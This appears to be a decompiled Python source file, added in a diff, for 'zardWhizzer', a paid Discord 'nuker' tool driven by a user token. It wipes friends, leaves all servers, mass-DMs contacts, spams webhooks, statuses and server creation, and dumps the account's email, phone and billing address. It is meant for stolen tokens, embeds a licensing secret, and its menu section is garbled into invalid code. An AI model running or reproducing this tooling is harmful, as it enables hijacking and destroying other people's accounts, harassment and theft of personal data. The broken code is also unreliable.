@@ -1,0 +1,612 @@
+import os
+import time
+import ctypes
+import typing
+import httpx
+import getpass
+import asyncio
+import pwinput
+import aiohttp
+import warnings
+from pystyle import *
+from json import dumps
+from lib.colorsLib import *
+from keyauth import *
+from tasksio import TaskPool
+from datetime import datetime
+from webbrowser import open as browser
+from lib.loggingLib import logger
+from lib.massDM import Client
+import lib.discordFlags as DiscordFlags
+try:
+    app = Keyauth(name='Whizzer', owner_id='xTYUlNa67z', secret='d42c90d96d71972518a98ec86e607aa0298d7d08265e55c2a5ef157e16bb3c1a', version='1.0', file_hash=None)
+except:
+    os._exit(0)
+warnings.filterwarnings('ignore', category=DeprecationWarning)
+
+class WhizzerV2(object):
+    def __init__(self):
+        self.logging = logger
+        self.version = '1.5'
+        self.printBanner()
+        self.handleKey()
+        self.checkUpdates()
+        self.token = self.input('Enter Token', pw=True)
+        self.username = ''
+        self.checkToken()
+        self.client = Client(self.token, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.124 Safari/537.36', 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vZGlzY29yZC5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiZGlzY29yZC5jb20iLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyOTE5NjMsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImRlc2lnbl9pZCI6MH0=')
+
+    def title(self, arg: str) -> typing.Coroutine:
+        ctypes.windll.kernel32.SetConsoleTitleW(f'zardWhizzer | {arg}')
+
+    def saveKey(self, key):
+        with open('license.key', 'w+') as file:
+            file.write(key)
+        logger.info(f'License key saved to `{G}license.key{W}`')
+        time.sleep(1.5)
+
+    def authKey(self, key: str) -> None:
+        keyauthResponse = app.license(key)
+        if keyauthResponse == True:
+            logger.status(f'{G}Successfully Validated License{W}{C}.{W}')
+            self.license = key
+            return True
+        logger.exception(f'License Authentication Failed: {R}{keyauthResponse[1]}{W}')
+        logger.error('Please buy a Valid License or Contact Zardex if you believe it\'s a mistake.')
+        browser('https://shop.zardex.cc')
+        time.sleep(5)
+        os._exit(0)
+
+    def checkUpdates(self):
+        try:
+            ver = httpx.get('https://zardex.cc/version.config')
+            if ver.status_code == 200:
+                version = ver.json()['zardWhizzer']
+                if version!= self.version:
+                    logger.info('This version has been outdated, please download new version')
+                    logger.info('Contact Zardex to get the new files.')
+                    os.system('start https://discord.zardex.cc')
+                    time.sleep(5)
+                    os._exit(0)
+            else:  # inserted
+                logger.exception('Failed to Check Updates! Please contact zardex')
+                os.system('start https://discord.zardex.cc')
+                time.sleep(4)
+                os._exit(0)
+        except:
+            logger.exception('Failed to Check Updates! Please contact zardex')
+            os.system('start https://discord.zardex.cc')
+            time.sleep(4)
+            os._exit(0)
+
+    def handleKey(self):
+        if os.path.exists('license.key'):
+            with open('license.key', 'r+') as file:
+                key = file.read()
+                file.close()
+            logger.status(f'{Y}Checking License Key...{W}')
+            self.authKey(key)
+        else:  # inserted
+            print()
+            logger.info(f'[ {G2}1{W} ] Buy License Key')
+            logger.info(f'[ {G2}2{W} ] Enter License Key')
+            print()
+            _choice = logger.input('Choice', int)
+            if _choice == 1:
+                browser('https://shop.zardex.cc')
+                input()
+                os._exit(0)
+            else:  # inserted
+                if _choice == 2:
+                    key = logger.input('Enter Valid License')
+                    logger.status(f'{Y}Checking License Key...{W}')
+                    if self.authKey(key):
+                        self.saveKey(key)
+
+    def headers(self) -> typing.Dict[str, str]:
+        return {'accept': '*/*', 'accept-language': 'en-US', 'authorization': self.token, 'content-type': 'application/json', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '\"Windows\"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.124 Safari/537.36', 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'en-US', 'x-discord-timezone': 'America/New_York', 'priority': 'u=1, i', 'referer': 'https://discord.com/channels/@me', 'sec-ch-ua': '\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"', 'x-discord-timezone': 'Asia/Bishkek', 'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vZGlzY29yZC5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiZGlzY29yZC5jb20iLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyOTE5NjMsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImRlc2lnbl9pZCI6MH0='}
+
+    def input(self, arg: str, type_: str=str, pw: bool=False) -> typing.Union[str, int]:
+        now = datetime.now()
+        time = now.strftime('%H:%M:%S')
+        print(f'        [38;5;209m[{W} [38;5;216m{time}{W} [38;5;209m]{W} - {arg}: ', end='')
+        if type_ == str:
+            if pw == True:
+                value = pwinput.pwinput('')
+            else:  # inserted
+                value = input()
+        else:  # inserted
+            value = int(input())
+        if value == '' or None:
+            return self.input(arg, type_)
+        return value
+
+    def printBanner(self) -> None:
+        print(f'\n        {G1}╦ ╦  ╦ ╦  ╦  ╔═╗  ╔═╗  ╔═╗  ╦═╗\n        {G2}║║║  ╠═╣  ║  ╔═╝  ╔═╝  ║╣   ╠╦╝\n        {G3}╚╩╝  ╩ ╩  ╩  ╚═╝  ╚═╝  ╚═╝  ╩╚═{W}\n        ([36;1m<{W}{C}/[36;1m>{W}) {C}www.zardex.cc{W} - {C}@issuers{W}\n        {GG}The tool may respect rate limit at some requests.{W}\n        ')
+
+    def checkToken(self) -> bool:
+        try:
+            with httpx.Client(headers=self.headers()) as client:
+                response = client.get('https://discord.com/api/v9/users/@me')
+                if response.status_code in [200, 201, 204]:
+                    self.username = response.json()['username']
+                    self.logging.info(f'{G}Logged into{W} {C}→{W} {G}{self.username}{W}')
+                    time.sleep(1)
+                    return True
+                if response.status_code == 403:
+                    self.logging.warning(f'{Y}Cannot Nuke a Locked Token!{W}')
+                    time.sleep(3)
+                    os._exit(0)
+                else:  # inserted
+                    if response.status_code == 401:
+                        self.logging.error(f'{R}Token is Invalid, please make sure you\'ve entered a valid token!{W}')
+                        time.sleep(3)
+                        os._exit(0)
+                    else:  # inserted
+                        self.logging.error(f'An unknown error prevented the login process: {R}{response.status_code}{W}')
+                        time.sleep(3)
+                        os._exit(0)
+        except Exception as sync_error:
+            self.logging.exception(f'{Y}Exception Occurred while Checking Token!{W}')
+            self.logging.exception(str(sync_error))
+            time.sleep(3)
+            os._exit(0)
+
+    async def get_flags(self) -> int:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            response = await client.get('https://discord.com/api/v9/users/@me')
+            if response.status == 200:
+                return (await response.json())['flags']
+            self.logging.error(f'Failed to Fetch User Flags [{R}{response.status}{W}]')
+            return 0
+
+    async def get_badges(self) -> str:
+        flags = await self.get_flags()
+        badge_names = []
+        if flags & DiscordFlags.Discord_Employee:
+            badge_names.append('Staff')
+        if flags & DiscordFlags.Partnered_Server_Owner:
+            badge_names.append('Partner')
+        if flags & DiscordFlags.HypeSquad_Events:
+            badge_names.append('Hypesquad Event')
+        if flags & DiscordFlags.Bug_Hunter_Level_1:
+            badge_names.append('Green Bug Hunter')
+        if flags & DiscordFlags.House_Bravery:
+            badge_names.append('Hypesquad Bravery')
+        if flags & DiscordFlags.House_Brilliance:
+            badge_names.append('Hypesquad Brilliance')
+        if flags & DiscordFlags.House_Balance:
+            badge_names.append('Hypesquad Balance')
+        if flags & DiscordFlags.Early_Supporter:
+            badge_names.append('Early Supporter')
+        if flags & DiscordFlags.Bug_Hunter_Level_2:
+            badge_names.append('Gold Bug Hunter')
+        if flags & DiscordFlags.Early_Verified_Bot_Developer:
+            badge_names.append('Verified Bot Developer')
+        if badge_names:
+            return ', '.join(badge_names)
+        return 'N/A'
+
+    async def getTokenInformation(self) -> None:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            self.badges = await self.get_badges()
+            fetched_data = await client.get('https://discord.com/api/v9/users/@me/billing/payment-sources')
+            fetched_data = fetched_data.json()
+            fetch = await client.get('https://discord.com/api/v9/users/@me')
+            fetch = await fetch.json()
+            friends_response = await client.get('https://discord.com/api/v9/users/@me/relationships')
+            friends_data = await friends_response.json()
+            friend_count = len(friends_data)
+            userID = fetch['id']
+            guilds_data = await client.get('https://discord.com/api/v9/users/@me/guilds')
+            guilds_data = await guilds_data.json()
+            guild_count = len(guilds_data)
+            nitro_request = await client.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions')
+            nitro_data = await nitro_request.json()
+            nitro = bool(len(nitro_data) > 0)
+            try:
+                if nitro:
+                    d1 = datetime.strptime(nitro_data[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
+                    d2 = datetime.strptime(nitro_data[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
+                    left = abs((d2 - d1).days)
+            except:
+                left = '00'
+            creation_date = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
+            if not fetched_data:
+                billing = False
+            else:  # inserted
+                billing = True
+            if billing:
+                self.logging.info(f'This information may not be accurate because it\'s fetched from {self.username}\'s payment method.')
+                print(f"\n        {G}•{W} Account ID: {C}{userID}{W}\n        {G}•{W} Account Creation Date: {C}{creation_date}{W}{G}•{W}{' Account Token: ' + C}{friend_count}{W}{'\n        ' + G}•{W}{' Account Token: ' + C}{W}{W}{'\n        ' + G}•{W}{' Account Creation Date: ' + C}{fetched_data[0]['billing_address']}{W}\n        {G}•{W} Country: {C}{fetched_data[0]['billing_address']['country']}{W}{'\n        ' + G}•{W}{'\n        ' + G}•{W}{' Account Token: ' + C}{W}{'\n        ' + G}•{W}{' Account Creation Date: ' + C}{W}{'\n        ' + G}{W}{'\n        ' + G}{W}{'\n        ' + G}{W}
+            if not billing:
+                print(f"\n        This user did not have a payment method added, hence there is limited information on the user.\n        {G}•{W} Account ID: {Y}{userID}{W}\n        {G}•{W} Account Email: {Y}{fetch['email']}{W}\n        {G}•{W} Account Phone Number: {Y}{fetch['phone']}{W}\n        {G}•{W} Account Token: {Y}{friend_count}{W}\n        {G}•{W} Nitro Status: {Y}{self.badges}{W}\n                ")
+
+    async def closeDM(self, channelID: str) -> typing.Callable:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            response = await client.delete(f'https://discord.com/api/v9/channels/{channelID}')
+            if response.status == 204:
+                self.logging.info(f'Closed DM [{G}{channelID}{W}]')
+                return
+            if response.status == 429:
+                json = await response.json()
+                self.logging.warning(f"Action Rate Limited [{R}{channelID}{W}] [{Y}{json['retry_after']}s{W}]")
+                await asyncio.sleep(json['retry_after'])
+                await self.closeDM(channelID)
+            else:  # inserted
+                self.logging.error(f'Failed to Close DM [{R}{channelID}{W}] [{R}{response.status}{W}]')
+                return None
+
+    async def fetchRelationships(self) -> typing.List[str]:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            response = await client.get('https://discord.com/api/v9/users/@me/relationships')
+            if response.status == 200:
+                friends = list()
+                json = await response.json()
+                for friend in json:
+                    friends.append(friend['id'])
+                if len(friends) < 1:
+                    return []
+                return friends
+            else:  # inserted
+                self.logging.error(f'Failed to Fetch Friends [{R}{response.status}{W}]')
+                return []
+
+    async def massDM(self, friendIds: list=[], msg: str='zardWhizzer') -> typing.Coroutine:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            for friendId in friendIds:
+                response = await client.post('https://discord.com/api/v9/users/@me/channels', json={'recipients': [friendId]})
+                if response.status == 200:
+                    channelID = (await response.json())['id']
+                    self.logging.status(f'Opened Channel [{G}{channelID}{W}]')
+                    resp = self.client.postMsg(channelID, msg)
+                    if resp == True:
+                        self.logging.info(f'Sent Message to Friend [{G}{channelID}{W}]')
+                    else:  # inserted
+                        if resp == 400:
+                            self.logging.error(f'Failed to Send, Change message content [{Y}{channelID}{W}]')
+                        else:  # inserted
+                            self.logging.error(f'Failed to Send Message to Friend [{R}{channelID}{W}]')
+                else:  # inserted
+                    self.logging.error(f'Failed to Open Channel [{R}{friendId}{W}] [{R}{response.status}{W}]')
+
+    async def spamWebhook(self, webhook: str, message: str='zardWhizzer') -> typing.Callable:
+        async with aiohttp.ClientSession() as client:
+            payload = {'content': message}
+            response = await client.post(f'https://discord.com/api/v9/webhooks/{webhook}', json=payload)
+            if response.status == 204:
+                self.logging.info(f'Sent Message to Webhook [{G}{webhook}{W}]')
+                return
+            if response.status == 429:
+                json = await response.json()
+                self.logging.warning(f"Action Rate Limited [{R}{webhook}{W}] [{Y}{json['retry_after']}s{W}]")
+                await asyncio.sleep(json['retry_after'])
+                await self.spamWebhook(webhook, message)
+            else:  # inserted
+                self.logging.error(f'Failed to Send Message to Webhook [{R}{webhook}{W}] [{R}{response.status}{W}]')
+                return None
+
+    async def ipLookup(self, ip: str) -> typing.Callable:
+        async with aiohttp.ClientSession() as client:
+            response = await client.get(f'http://ipinfo.io/{ip}/json', headers={'content-type': 'application/json'})
+            if response.status == 200:
+                information = await response.json()
+                city = information.get('city', 'N/A')
+                state = information.get('region', 'N/A')
+                country = information.get('country', 'N/A')
+                location = information.get('loc', 'N/A')
+                postal_code = information.get('postal', 'N/A')
+                timezone = information.get('timezone', 'N/A')
+                self.logging.info('Fetched Data from the assigned IP address (Accurate)')
+                print(f"\n        {G}{G}•{W}{W} Country: [36;1m{country}{W}\n        {G}•{W} State: [36;1m{state}{W}\n        {G}•{W} City: [36;1m{city}{W}\n        {G}•{W} Location: [36;1m{'https://www.google.com/maps/place/' + location}{W}\n        {G}•{W} Latitude & Longitude: [36;1m{location}{W} \n        {G}•{W} Area Timezone: [36;1m{timezone}{W} ")
+            else:  # inserted
+                self.logging.error(f'Failed to Fetch Data from the assigned IP address [{R}{ip}{W}] [{R}{response.status}{W}]')
+                return None
+
+    async def removeFriend(self, userId: str) -> typing.Callable:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            response = await client.delete(f'https://discord.com/api/v9/users/@me/relationships/{userId}')
+            if response.status == 204:
+                self.logging.info(f'Removed Friend [{G}{userId}{W}]')
+                return
+            if response.status == 429:
+                json = await response.json()
+                self.logging.warning(f"Action Rate Limited [{R}{userId}{W}] [{Y}{json['retry_after']}s{W}]")
+                await asyncio.sleep(json['retry_after'])
+                await self.removeFriend(userId)
+            else:  # inserted
+                self.logging.error(f'Failed to Remove Friend [{R}{userId}{W}] [{R}{response.status}{W}]')
+                return None
+
+    async def blockFriend(self, userId: str):
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            response = await client.put(f'https://discord.com/api/v9/users/@me/relationships/{userId}', json={'type': 2})
+            if response.status == 204:
+                self.logging.info(f'Blocked Friend [{G}{userId}{W}]')
+                return
+            if response.status == 429:
+                json = await response.json()
+                self.logging.warning(f"Action Rate Limited [{R}{userId}{W}] [{Y}{json['retry_after']}s{W}]")
+                await asyncio.sleep(json['retry_after'])
+                await self.blockFriend(userId)
+            else:  # inserted
+                self.logging.error(f'Failed to Block Friend [{R}{userId}{W}] [{R}{response.status}{W}]')
+                return None
+
+    async def spamThemes(self, amount: int=5) -> typing.Coroutine:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            for i in range(int(amount)):
+                await client.patch('https://discord.com/api/v9/users/@me/settings', json={'theme': 'dark'})
+                self.logging.info(f'Set Theme to {G}Dark{W} [{G}{i}{W}]')
+                await asyncio.sleep(1)
+                await client.patch('https://discord.com/api/v9/users/@me/settings', json={'theme': 'light'})
+                self.logging.info(f'Set Theme to {G}Light{W} [{G}{i}{W}]')
+                await asyncio.sleep(1)
+                await client.patch('https://discord.com/api/v9/users/@me/settings', json={'theme': 'dark'})
+                self.logging.info(f'Set Theme to {G}Dark{W} [{G}{i}{W}]')
+                await asyncio.sleep(1)
+
+    async def leaveServer(self, serverId: str) -> typing.Callable:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            response = await client.delete(f'https://discord.com/api/v9/users/@me/guilds/{serverId}')
+            if response.status == 204:
+                self.logging.info(f'Left Server [{G}{serverId}{W}]')
+                return
+            if response.status == 429:
+                json = await response.json()
+                self.logging.warning(f"Action Rate Limited [{R}{serverId}{W}] [{Y}{json['retry_after']}s{W}]")
+                await asyncio.sleep(json['retry_after'])
+                await self.leaveServer(serverId)
+            else:  # inserted
+                self.logging.error(f'Failed to Leave Server [{R}{serverId}{W}] [{R}{response.status}{W}]')
+                return None
+
+    async def createServer(self, serverName: str='zardWhizzer') -> typing.Callable:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            payload = {'name': serverName, 'region': 'us-west', 'icon': None, 'channels': None}
+            async with client.post('https://discord.com/api/v9/guilds', json=payload) as response:
+                if response.status == 201:
+                    serverID = (await response.json())['id']
+                    self.logging.info(f'Created Server [{G}{serverName}{W}]')
+                    return serverID
+                if response.status == 429:
+                    json = await response.json()
+                    self.logging.warning(f"Action Rate Limited [{R}{serverName}{W}] [{Y}{json['retry_after']}s{W}]")
+                    await asyncio.sleep(json['retry_after'])
+                    await self.createServer(serverName)
+                else:  # inserted
+                    self.logging.error(f'Failed to Create Server [{R}{serverName}{W}] [{R}{response.status}{W}]')
+                    return None
+
+    async def deleteWebhook(self, webhook: str) -> typing.Coroutine:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            response = await client.delete(f'https://discord.com/api/v9/webhooks/{webhook}')
+            if response.status == 204:
+                self.logging.info(f'Deleted Webhook [{G}{webhook}{W}]')
+                return
+            if response.status == 429:
+                json = await response.json()
+                self.logging.warning(f"Action Rate Limited [{R}{webhook}{W}] [{Y}{json['retry_after']}s{W}]")
+                await asyncio.sleep(json['retry_after'])
+                await self.deleteWebhook(webhook)
+            else:  # inserted
+                self.logging.error(f'Failed to Delete Webhook [{R}{webhook}{W}] [{R}{response.status}{W}]')
+                return None
+
+    async def cycleStatus(self, _1: str, _2: str, _3: str, amount: int=3) -> typing.Coroutine:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            for i in range(int(amount)):
+                await client.patch('https://discord.com/api/v9/users/@me/settings', json={'custom_status': {'text': _1}})
+                self.logging.info(f'Set Status to [{G}{_1}{W}] [{G}{i}{W}]')
+                await asyncio.sleep(1)
+                await client.patch('https://discord.com/api/v9/users/@me/settings', json={'custom_status': {'text': _2}})
+                self.logging.info(f'Set Status to [{G}{_2}{W}] [{G}{i}{W}]')
+                await asyncio.sleep(1)
+                await client.patch('https://discord.com/api/v9/users/@me/settings', json={'custom_status': {'text': _3}})
+                self.logging.info(f'Set Status to [{G}{_3}{W}] [{G}{i}{W}]')
+                await asyncio.sleep(1)
+
+    async def renameFriends(self, userID: str, name: str='zardWhizzer') -> typing.Coroutine:
+        async with aiohttp.ClientSession(headers=self.headers()) as client:
+            response = await client.patch(f'https://discord.com/api/v9/users/@me/relationships/{userID}', json={'nick': name})
+            if response.status == 204:
+                self.logging.info(f'Renamed Friend [{G}{userID}{W}]')
+                return
+            if response.status == 429:
+                json = await response.json()
+                self.logging.warning(f"Action Rate Limited [{R}{userID}{W}] [{Y}{json['retry_after']}s{W}]")
+                await asyncio.sleep(json['retry_after'])
+                await self.renameFriends(userID, name)
+            else:  # inserted
+                self.logging.error(f'Failed to Rename Friend [{R}{userID}{W}] [{R}{response.status}{W}]')
+                return None
+
+    async def Menu(self) -> typing.Coroutine:
+        os.system('cls')
+        self.printBanner()
+        self.title(f'Menu | {self.username}')
+        print(f'\n        ({C1}1{W})    Wipe out Friends\n        ({C1}2{W})    Leave Servers\n        ({C1}3{W})    Get Address & Name & Misc info\n        ({C1}4{W})    Close Opened DMS\n        ({C1}5{W})    Block Every Friends\n        ({C1}6{W})    Randomize User Settings\n        ({C1}7{W})    Mass DM the Friends\n        ({C1}8{W})    Delete a Discord Webhook\n        ({C1}9{W}\'s account\n        ({C1}10{W})   Spam {WW}{self.username}{W}\'s Status\n        ({C1}11{W})   IP Lookup\n        ({C1}12{W})   Spam a Webhook\n        ({C1}13{W})   Change Friend Nicknames\n        ({C1}x{W})    License Information\n            \n            ')
+        option = input(f'        └─({G3}@{W}{getpass.getuser()}) → ')
+        if option == '1':
+            self.title('Remove All Friends')
+            async with aiohttp.ClientSession(headers=self.headers()) as client:
+                response = await client.get('https://discord.com/api/v9/users/@me/relationships')
+                if response.status == 200:
+                    friends_data = await response.json()
+                    users = [friend['id'] for friend in friends_data]
+                    if len(users) < 1:
+                        self.logging.warning('No Friends found in the account.')
+                        time.sleep(2)
+                        await self.Menu()
+                    async with TaskPool(5) as executor:
+                        for userId in users:
+                            await executor.put(self.removeFriend(userId))
+                    await self.Menu()
+                else:  # inserted
+                    self.logging.error('Failed to Fetch Friends list, cannot use this now.')
+                    await asyncio.sleep(2)
+                    await self.Menu()
+        else:  # inserted
+            if option == '2':
+                self.title('Leave All Servers')
+                async with aiohttp.ClientSession(headers=self.headers()) as client:
+                    response = await client.get('https://discord.com/api/v9/users/@me/guilds')
+                    if response.status == 200:
+                        guilds_data = await response.json()
+                        guilds = [guild['id'] for guild in guilds_data]
+                        if len(guilds) < 1:
+                            self.logging.warning('No Servers found in the account.')
+                            time.sleep(2)
+                            await self.Menu()
+                        async with TaskPool(5) as executor:
+                            for guildID in guilds:
+                                await executor.put(self.leaveServer(guildID))
+                        await self.Menu()
+                    else:  # inserted
+                        self.logging.error('Failed to Fetch Servers list, cannot use this now.')
+                        await asyncio.sleep(2)
+                        await self.Menu()
+            else:  # inserted
+                if option == '3':
+                    self.title('Fetch Token Information')
+                    await self.getTokenInformation()
+                    input()
+                    await self.Menu()
+                else:  # inserted
+                    if option == '4' and self.title('Close Opened DMS'):
+                        async with aiohttp.ClientSession(headers=self.headers()) as client:
+                            response = await client.get('https://discord.com/api/v9/users/@me/channels')
+                            if response.status == 200:
+                                channels = []
+                                channels_data = await response.json() for channel in channels_data for channels in channels.append(channel['id']):
+                                    pass  # postinserted
+                                if len(channels) < 1:
+                                    self.logging.warning('No Opened DMS found in the account.')
+                                    time.sleep(2), await self.Menu()
+                                async with TaskPool(5) as executor, channels for channelID in channels and executor.put(5):
+                                    @self.closeDM
+                                    await channelID()
+                                    await self.Menu() if self.logging.error('Failed to Fetch Opened DMS list, cannot use this now.') else self.logging.error('ignore')
+                            else:  # inserted
+                                await asyncio.sleep(2)
+                                await self.Menu()
+                            pass
+                        pass
+                    else:  # inserted
+                        if option == '5':
+                            self.title('Block All Friends')
+
+                            @aiohttp.ClientSession
+                            async with self.headers() as client, await client.get('https://discord.com/api/v9/users/@me/relationships') as response:
+                                if response.status == 200:
+                                    friends_data = await response.json()
+                                    users = [friend['id'] for friend in friends_data]
+                                    if len(users) < 1 and self.logging.warning('No Friends found in the account.'):
+                                        time.sleep(2), await self.Menu()
+                                    async with TaskPool(5) as executor, self.blockFriend(userId) as <Code38 code object executeWhizzer at 0x727fc1318090, file main.py>, line 695:
+                                        await self.Menu()(self.logging.error('Failed to Fetch Friends list, cannot use this now.'))
+                                else:  # inserted
+                                    await asyncio.sleep(2), await self.Menu()
+                                pass
+                            await option == '6' and self.title('Randomize User Settings')
+
+                            @self.input('Spam Amount')
+                            amount = int(self.spamThemes('amount'), int)
+                            await amount
+                            logger.info('Finished Randomizing User Settings')
+                            time.sleep(2), await self.Menu()
+                        else:  # inserted
+                            if option == '7' and self.title('Mass DM Friends') == self.input('Enter Message'):
+                                message = str.message(await self.fetchRelationships(), friendIds=await self.massDM(friendIds))
+                                await message
+                                self.logging.info('Finished Task.. Going Back in 2 seconds')
+                                time.sleep(2)(await self.Menu()) if option == '8' else await self.title('Delete Discord Webhook')(*self.input('Webhook', str), datetime=await self.deleteWebhook(webhook), open=await self.Menu())
+                            else:  # inserted
+                                if option == '9' and self.title('Spam Create Servers') == self.input('Server Names'):
+                                    name = str(self.input('Spam Amount'), str)
+                                    amount = int.amount('_Spider__path', '_Spider__path')
+
+                                    @range
+                                    for _ in amount: await self.createServer(name) if option == '10' else await self.title('Spam Status') + await self.input('Status 1') if option == '10' else await self.title('dumps') if option == '10' else await self.title('TaskPool') for _ in amount:
+                                        pass  # postinserted
+                                    one = str(self.input('Status 2'), str)
+                                    two = self.input('Status 3', str)
+                                    amount = int(self.cycleStatus(one), int)
+
+                                    @two
+                                    @three
+                                    await self.Menu()
+                                else:  # inserted
+                                    if option == '11' and self.title('IP Lookup') == self.input('IP Address') as ip:
+                                        await self.ipLookup(ip)
+                                        input() + await self.Menu()
+                                    else:  # inserted
+                                        self.title('Spam Webhook') if option == '12' and self.title('Spam Webhook') in self.input('Webhook', str) or 'https' not in webhook or 'webhook' not in webhook and (not self.logging.error('Invalid Webhook [')) or (not self.logging.error('TaskPool')) or (not self.logging.error('datetime')) or (not self.logging.error('open')) or (not self.logging.error('logger')) or (not self.logging.error('Client')) or (not self.logging.error('<mask_18>')) or (not self.logging.error('owner_id')) or (not self.logging.error('secret')) or (not self.logging.error('version')) or (not self.logging.error('file_hash')) or (not self.logging.error(
+                                            return f'{R}{webhook}'
+                                            W.](f'')
+                                            await asyncio.sleep(2), await self.Menu(), await self.input('Message')
+                                        message = str(self.input('Spam Amount'), str)
+                                        amount = int.amount('_Spider__path', '_Spider__path')
+
+                                        @range
+                                        for _ in amount for _ in self.spamWebhook(webhook):
+                                            await message
+                                        await asyncio.sleep(2), await self.Menu()
+                                    else:  # inserted
+                                        if option == '13' and self.title('Rename Friends') == self.input('Name'):
+                                            friends = str(name, await self.fetchRelationships())
+
+                                            @len
+                                            if friends(friends) < 1 and self.logging.warning('No Friends found in the account.'):
+                                                async with time.sleep(2), await self.Menu(), TaskPool(5) as executor, executor.put(self.renameFriends()) for userId in friends:
+                                                    pass  # postinserted
+                                                await userId(name)
+                                                pass
+                                            await asyncio.sleep(2), await self.Menu()
+                                        else:  # inserted
+                                            if option == 'x' and self.title('License Information'):
+                                                logger.info('Fetching License Information..')
+                                                pc_username = os.getenv('USERNAME')
+
+                                                @logger.info('License: ')
+                                                return f'{G}{self.license[:15]}* * * *'
+                                                W.Whizzer(f'')
+
+                                                @logger.info('Plan: ')
+                                                f'{G}Lifetime'
+                                                W.Whizzer(f'')
+
+                                                @logger.info('Status: ')
+                                                f'{G}Active'
+                                                W.Whizzer(f'')
+
+                                                @logger.info('Expires: ')
+                                                f'{G}Never'
+                                                W.Whizzer(f'')
+
+                                                @logger.info('Registered User: ')
+                                                @f'{G}'
+                                                f'{pc_username}'
+                                                W.Whizzer(f'')
+                                                print()
+                                                logger.info('Press any key to go back to the menu.')
+                                                input() + await self.Menu()
+                                            else:  # inserted
+                                                self.logging.info('Invalid Option, please try again.')
+                                                time.sleep(2), await self.Menu()
+        return None
+
+def executeWhizzer():
+    try:
+        ctypes.windll.kernel32.SetConsoleTitleW('Whizzer | Enter Token')
+        os.system('cls')
+        asyncio.run(WhizzerV2().Menu())
+    except Exception as WhizzerError:
+        os.system('cls')
+        logger.exception(f'Error: {R}{WhizzerError}{W}')
+        logger.warning('Please show this error to Zardex, very sorry for the inconvenience.')
+        logger.warning('Discord Server: discord.zardex.cc | @issuers')
+        time.sleep(10)
+        os._exit(0)
+if __name__ == '__main__':
+    executeWhizzer()
